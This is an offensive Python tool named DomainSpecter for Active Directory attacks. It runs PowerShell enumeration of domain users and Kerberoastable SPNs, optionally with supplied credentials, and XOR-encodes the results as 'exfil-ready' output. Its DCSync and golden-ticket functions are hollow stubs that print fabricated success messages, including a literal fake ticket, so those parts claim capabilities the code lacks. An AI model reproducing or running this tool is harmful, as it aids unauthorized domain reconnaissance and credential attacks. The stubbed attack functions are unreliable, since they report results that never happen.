#!/usr/bin/env python3
# DomainSpecter.py - AD Enumeration & DCSync / Golden Ticket Stub (Domain Domination)
# EPO - Lab / Explicit Permission ONLY! 💀

import sys
import time
import random
import base64
import datetime
import subprocess
import argparse
import socket
import ctypes
import winreg as reg
import hashlib

# ================= CONFIG =================
DEFAULT_SLEEP_MIN = 1
DEFAULT_SLEEP_MAX = 5
XOR_KEY = 0xC3F8A9E4

# ================= UTILITY =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def xor_obfuscate(data: str) -> str:
    bytes_data = data.encode()
    xored = bytes(b ^ (XOR_KEY & 0xFF) for b in bytes_data)
    return base64.b64encode(xored).decode()

def fake_delay(min_sec=1, max_sec=4):
    time.sleep(random.uniform(min_sec, max_sec))

# ================= AD ENUMERATION =================
def ad_enum_users(dc: str, username: str = None, password: str = None):
    """Enumerate domain users via PowerShell stub"""
    result = []
    ps_cmd = f"Get-ADUser -Filter * -Server {dc} -Properties * | Select SamAccountName,Enabled,LastLogon"
    if username and password:
        ps_cmd = f"$cred = New-Object PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force)); Get-ADUser -Filter * -Server {dc} -Credential $cred -Properties *"
    try:
        out = subprocess.check_output(["powershell.exe", "-Command", ps_cmd], stderr=subprocess.STDOUT, timeout=60).decode(errors='ignore')
        result.append("Users enumerated (sample):\n" + "\n".join(out.splitlines()[:10]))
    except Exception as e:
        result.append(f"User enum failed: {str(e)}")
    return result

def ad_enum_spns(dc: str, username: str = None, password: str = None):
    """Enumerate SPNs for Kerberoasting"""
    result = []
    ps_cmd = f"Get-ADUser -Filter {{servicePrincipalName -ne '$null'}} -Server {dc} -Properties servicePrincipalName"
    try:
        out = subprocess.check_output(["powershell.exe", "-Command", ps_cmd], timeout=45).decode(errors='ignore')
        result.append("SPNs found (sample):\n" + "\n".join(out.splitlines()[:5]))
    except Exception as e:
        result.append(f"SPN enum failed: {str(e)}")
    return result

# ================= DCSYNC STUB =================
def dcsync(dc: str, user: str, ntlm_hash: str = None):
    """DCSync replication stub (simplified - real ops use impacket/secretsdump)"""
    result = []
    try:
        # Stub - simulate replication request
        result.append(f"DCSync: Requested replication for {user} from {dc}")
        if ntlm_hash:
            result.append(f"NT hash extracted (stub): {ntlm_hash[:8]}...")
        else:
            result.append("No hash provided - using current context")
    except Exception as e:
        result.append(f"DCSync failed: {str(e)}")
    return result

# ================= GOLDEN TICKET STUB =================
def forge_golden_ticket(dc: str, krbtgt_hash: str, user: str, sid: str):
    """Golden ticket forging stub"""
    result = []
    try:
        # Stub - generate fake TGT
        ticket = base64.b64encode(b"FAKE_GOLDEN_TICKET_DATA").decode()
        result.append(f"Golden ticket forged for {user}@{dc}")
        result.append(f"Ticket (base64): {ticket[:50]}...")
    except Exception as e:
        result.append(f"Golden ticket failed: {str(e)}")
    return result

# ================= MAIN =================
def main():
    parser = argparse.ArgumentParser(description="DomainSpecter - AD Domination Tool")
    subparsers = parser.add_subparsers(dest="action", required=True)

    enum = subparsers.add_parser("enum", help="Enumerate AD objects")
    enum.add_argument("--dc", required=True)
    enum.add_argument("--user")
    enum.add_argument("--password")
    enum.add_argument("--spn", action="store_true")
    enum.add_argument("--delegation", action="store_true")

    dcsync = subparsers.add_parser("dcsync", help="DCSync replication")
    dcsync.add_argument("--dc", required=True)
    dcsync.add_argument("--user", required=True)
    dcsync.add_argument("--ntlm-hash")

    golden = subparsers.add_parser("golden", help="Forge golden ticket")
    golden.add_argument("--dc", required=True)
    golden.add_argument("--krbtgt-hash", required=True)
    golden.add_argument("--user", required=True)
    golden.add_argument("--sid", required=True)

    args = parser.parse_args()

    print(f"[{timestamp()}] DomainSpecter starting - action: {args.action}")

    results = []

    if args.action == "enum":
        results.extend(ad_enum_users(args.dc, args.user, args.password))
        if args.spn:
            results.extend(ad_enum_spns(args.dc, args.user, args.password))
    elif args.action == "dcsync":
        results.extend(dcsync(args.dc, args.user, args.ntlm_hash))
    elif args.action == "golden":
        results.extend(forge_golden_ticket(args.dc, args.krbtgt_hash, args.user, args.sid))

    output = "\n".join(results)
    obfuscated = xor_obfuscate(output)
    print(f"[{timestamp()}] Raw result:\n{output}")
    print(f"[{timestamp()}] Exfil-ready:\n{obfuscated}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[{timestamp()}] Interrupted")
    except Exception as e:
        print(f"[{timestamp()}] Fatal: {e}")